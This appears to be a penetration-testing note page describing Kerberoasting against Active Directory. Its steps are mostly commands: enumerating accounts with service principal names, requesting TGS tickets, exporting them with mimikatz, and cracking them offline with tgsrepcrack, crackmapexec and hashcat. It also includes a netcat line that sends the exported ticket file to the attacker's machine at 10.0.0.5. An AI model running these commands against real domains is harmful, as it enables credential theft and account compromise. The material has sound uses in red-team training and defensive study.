# Kerberosting

The goal of Kerberoasting is to harvest TGS tickets for services that run on behalf of user accounts in the AD, not computer accounts. Thus, part of these TGS tickets is encrypted with keys derived from user passwords. As a consequence, their credentials could be cracked offline

{% hint style="warning" %}
To perfom this attack, you need an account on the domain.
{% endhint %}

{% hint style="warning" %}
Kerberosting needs at least one user account with `ServicePrincipalName` attribute set. only user accounts with this property set are likely susceptible to kerberosting.
{% endhint %}

#### <mark style="color:green;">setup a listener to reveive the hash for cracking:</mark>

```
nc -lvp 443 > kerberoast.bin
```

### <mark style="color:orange;">Extracting the Ticket</mark>

Attacker enumerating user accounts with `serverPrincipalName` attribute set:

```
Get-NetUser | Where-Object {$_.servicePrincipalName} | fl
```

![](<../../../.gitbook/assets/image (48).png>)

Additionally, user accounts with SPN set could be extracted with a native windows binary:

```
setspn -T offense -Q */*
```

![](<../../../.gitbook/assets/image (18).png>)

Attacker requesting a kerberos ticket (TGS) for a user account with servicePrincipalName set to `HTTP/dc-mantvydas.offense.local`- it gets stored in the memory:

```
Add-Type -AssemblyName System.IdentityModel  
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "HTTP/dc-mantvydas.offense.local"
```

Using mimikatz, the attacker extracts kerberos ticket from the memory and exports it to a file for cracking:

```csharp
mimikatz # kerberos::list /export
```

![](<../../../.gitbook/assets/image (54).png>)

Attacker sends the exported service ticket to attacking machine for offline cracking:

```
nc 10.0.0.5 443 < C:\tools\mimikatz\x64\2-40a10000-spotless@HTTP~dc-mantvydas.offense.local-OFFENSE.LOCAL.kirbi
```

### <mark style="color:orange;">Cracking the Ticket</mark>

Attacker brute forces the password of the service ticket:

```
python2 tgsrepcrack.py pwd kerberoast.bin
```

## <mark style="color:red;">Using crackmapexec</mark>

```
cme ldap 192.168.0.104 -u harry -p pass --kerberoasting output.txt
```

#### cracking with hashcat

```
/hashcat -m13100 output.txt wordlist.txt
```
